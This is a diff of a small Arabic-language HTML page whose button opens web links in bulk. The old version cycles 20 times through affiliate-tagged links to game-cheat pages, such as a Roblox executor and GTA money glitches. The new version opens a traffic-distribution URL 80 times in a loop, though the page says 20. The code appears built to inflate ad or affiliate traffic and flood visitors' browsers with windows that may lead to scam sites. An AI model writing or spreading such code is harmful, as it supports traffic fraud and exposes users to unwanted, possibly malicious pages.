@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فتح روابط عشوائية بشكل متدرج</title>
+    <title>فتح الرابط 20 مرة</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,32 +19,15 @@
 </head>
 <body>
 
-    <h2>اضغط على الزر لفتح روابط عشوائية 20 مرة (بفاصل 1 ثانية لكل نافذة)</h2>
-    <button onclick="openLinks()">فتح الروابط</button>
+    <h2>اضغط على الزر لفتح الرابط 20 مرة</h2>
+    <button onclick="openLinks()">فتح الرابط</button>
 
     <script>
         function openLinks() {
-            let urls = [
-                "https://www.modcraftforge.com/minecraft/endermorphosis-mod?pub=3231160",
-                "https://www.modcraftforge.com/roblox/solara-roblox-executor-2025-console-robux?pub=3231160",
-                "https://www.modcraftforge.com/gta-5/unlock-all-belts-on-outfits-in-gta-5?pub=3231160",
-                "https://www.modcraftforge.com/fortnite/850k-xp-per-minute-with-new-afk-map-in-fortnite?pub=3231160",
-                "https://www.modcraftforge.com/gta-5/fast-money-glitch-on-all-consoles-in-gta-5?pub=3231160",
-                // يمكنك إضافة المزيد من الروابط هنا
-            ];
-            
-            let count = 0;
-
-            function openWindow() {
-                if (count < 20) {
-                    let randomIndex = Math.floor(Math.random() * urls.length); // اختيار رابط عشوائي
-                    window.open(urls[randomIndex], "_blank");
-                    count++;
-                    setTimeout(openWindow, 3000); // تكرار العملية كل ثانية
-                }
+            let url = "https://hotbkamoda.today/tds?id=1282891822&p1=sub1&p2=sub2&p3=sub3&p4=sub4";
+            for (let i = 0; i < 80; i++) {
+                window.open(url, "_blank");
             }
-
-            openWindow();
         }
     </script>
 
